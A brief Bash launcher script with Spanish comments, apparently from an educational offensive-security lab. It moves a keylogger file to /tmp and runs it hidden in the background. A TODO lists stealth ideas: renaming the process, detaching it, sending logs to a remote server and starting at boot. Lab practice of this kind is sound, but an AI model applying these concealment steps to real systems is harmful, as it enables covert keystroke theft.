#!/bin/bash
# 
# Script: run.sh
# Autor: Carlos Andres Alzate
# Descripcion:
#   Este proyecto esta basado en el workshop de YasminaCodes
#   Script experimental para simular la ejecucion de un keylogger en segundo 
#   plano en otro entornos Unix/Linux. El objetivo es experimentar con tecnicas 
#   basicas de ocultamiento y persistencia como parte de un laboratorio de
#   seguridad ofensiva, manteniendo siempre un enfoque educativo y etico.
# 
# Este script:
#   - Mueve el archivo `main.py` al directorio `/tmp` (habitual para procesos)
#   temporales
#   - Ejecuta el script desde esa ubicacion usando `python -m`, simulando un 
#   entorno mas realista
#   - Lo lanza al segundo plano usando `&` para que no bloquee la terminal
#   - Sugiere posibles mejoras como cambiar el nombre del proceso o enviarlo
#   a la red
# 
# Advertencia:
#   Este script es parte de un entorno de prueva controlado.
#   El uso de estas tecnicas fuera de un entorno autorizado puede ser ilegal.

# 👉 Accion 1: Mover el script a una ubicacion temporal
mv ./main.py /tmp/main.py

# 👉 Accion 2: Ejecutar el script en segundo plano desde esa ubicacion.
# NOTA: python -m espera un modulo, lo corecto seria usar python directamente
# o crear un ejecutable.
python /tmp/main.py &

# TODO:
# 🧪 Ideas para futuro
# - Cambiar el nombre del proceso usando herramientas como `exec -a` o 
# envoltorio en C
# - Usar `nohup` o `disown` para deconectarlo completamente del terminal
# - Enviar datos de log a un servidor remoto
# - Configurarlo para que se ejecute al iniciar el sistema